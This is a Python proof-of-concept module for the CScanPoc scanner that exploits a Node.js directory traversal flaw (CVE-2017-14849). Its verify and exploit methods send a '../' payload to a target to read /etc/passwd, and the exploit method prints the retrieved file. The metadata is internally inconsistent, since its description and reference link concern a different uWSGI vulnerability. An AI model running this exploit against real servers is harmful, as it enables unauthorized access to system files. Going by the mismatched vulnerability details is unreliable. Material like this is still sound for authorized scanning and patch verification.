# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Node.js_0001_p'  # 平台漏洞编号，留空
    name = 'Node.js 目录穿越漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨域目录，读取或运行DOCUMENT_ROOT目录以外的文件。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/uwsgi/CVE-2018-7490'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2017-14849'  # cve编号
    product = 'Node.js'  # 漏洞应用名称
    product_version = 'Node.js 8.5.0 到8.6.0版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b99883a5-9bc8-4ca2-b1d2-ec7a2beecff4'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 根据payload的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/static/../../../a/../../../../etc/passwd'
            request = requests.get('{target}{params}'.format(
                target=self.target, params=payload))
            r = request.text
            if 'root:x:0:0:root:/root:/bin/bash' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 这里是poc利用，这次是输出了/etc/passwd结果，后期可添加参数，用户将可以定制化自己提供的参数
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/static/../../../a/../../../../etc/passwd'
            request = requests.get('{target}{params}'.format(
                target=self.target, params=payload))
            r = request.text
            if 'root:x:0:0:root:/root:/bin/bash' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，本次获取到目标数据是:\n{r}'.format(
                    target=self.target, name=self.vuln.name, r=r))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
